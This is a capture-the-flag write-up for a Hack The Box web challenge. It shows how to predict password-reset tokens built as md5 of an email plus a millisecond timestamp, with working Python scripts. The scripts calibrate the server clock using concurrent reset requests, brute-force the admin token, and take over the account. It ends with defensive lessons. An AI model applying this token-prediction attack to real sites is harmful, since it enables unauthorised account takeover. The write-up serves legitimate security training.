# Predictable — web, hard — 1000 pts

**Flag:** `HTB{pr3d1ct4bl3_s33ds_4r3_s0000_pr3d1ct4bl3!_f839f4405c44cafe7f1480ed3485c8e3}`

A Node/Express app with password reset. `/dashboard` reads `/flag` when the session user is
`admin@hackthebox.com`. Source provided.

The naive attack is a 3000-candidate online brute force. The interesting part of this solve is
collapsing it to about 30.

---

## Step 1 — the bug

`challenge/helpers/ResetToken.js`:

```js
const currentTime = Date.now();
const seed  = email + currentTime.toString();
const token = crypto.createHash('md5').update(seed).digest('hex');
```

The reset token is `md5(email + millisecond_epoch)`. The email is known. The **only** unknown is
which millisecond the server was on. `database.js`'s migration guarantees `admin@hackthebox.com`
exists.

## Step 2 — why the naive approach is painful

You do not know the server's clock offset from yours — network latency, container clock drift and
request queuing easily add seconds. Guessing a ±1.5 s window means ~3000 candidate tokens, each
requiring a `POST /api/reset-password` round trip. Against a single-threaded app that is slow, noisy,
and likely to wedge the instance.

## Step 3 — calibrate the server's clock exactly

The trick: **make the server mint a token for an address we control at the same instant it mints
one for admin.** Then recover our own token by legitimate means and brute-force it *offline* to
learn the server's exact `Date.now()`.

1. Register a throwaway address.
2. Fire **two** `POST /api/forgot-password` requests concurrently, released together with a
   `threading.Barrier`: one for `admin@hackthebox.com`, one for our throwaway.

```python
import threading, requests
barrier = threading.Barrier(2)
def fire(email):
    barrier.wait()
    return requests.post(f'{BASE}/api/forgot-password', json={'email': email})
```

3. The response to *our* address embeds an `iframe` with an **ethereal.email** preview URL — the app
   uses a nodemailer test account. Fetch that page and read our token in cleartext.

4. Brute-force `md5(ourEmail + t)` **offline** across a few-second window until it matches:

```python
import hashlib
for t in range(t_lo, t_hi):
    if hashlib.md5((OUR_EMAIL + str(t)).encode()).hexdigest() == our_token:
        T_self = t; break
# T_self = 1789824918275
```

That is the server's exact millisecond. Because both requests were released together, the admin
token was minted within a few milliseconds of it.

## Step 4 — the narrow brute force

```python
import hashlib, requests
from concurrent.futures import ThreadPoolExecutor

cands = sorted(range(T_self - 500, T_self + 500), key=lambda t: abs(t - T_self))

def attempt(t):
    tok = hashlib.md5((b'admin@hackthebox.com' + str(t).encode())).hexdigest()
    r = requests.post(f'{BASE}/api/reset-password',
                      json={'token': tok, 'password': 'Passw0rd!123'})
    return tok if 'success' in r.text else None

with ThreadPoolExecutor(6) as ex:
    for hit in ex.map(attempt, cands):
        if hit: print('token', hit); break
```

Ordering candidates by distance from `T_self` means the hit comes early — ours landed at
**`T_self − 14 ms`**, token `241f92e7b826e6e397cf80612b368299`.

**No time pressure:** admin is flagged `isAdmin`, so no email is dispatched for its reset — but the
token is still **stored and valid for one hour**. The clock calibration only needs to be accurate
once; it does not have to be fast.

## Step 5 — collect

```console
POST /api/login  {"email":"admin@hackthebox.com","password":"Passw0rd!123"}
GET  /dashboard  ->  HTB{pr3d1ct4bl3_s33ds_4r3_s0000_pr3d1ct4bl3!_f839f4405c44cafe7f1480ed3485c8e3}
```

---

## Lessons

- **`Date.now()` is not entropy.** Security tokens need `crypto.randomBytes` (or
  `crypto.randomUUID`). Hashing a timestamp does not add unpredictability — MD5 of a known-format
  input with one small unknown is just that unknown.
- **Generalisable trick: use a self-service action to calibrate a remote clock.** Any feature that
  derives a value from server time *and* returns that value to you converts an unknown offset into a
  known constant, shrinking every subsequent time-based search.
- Order brute-force candidates by likelihood, not numerically — it turns worst case into expected case.
- Check the token's *lifetime* before optimising for speed. An hour-long validity window means you
  can afford to be careful.
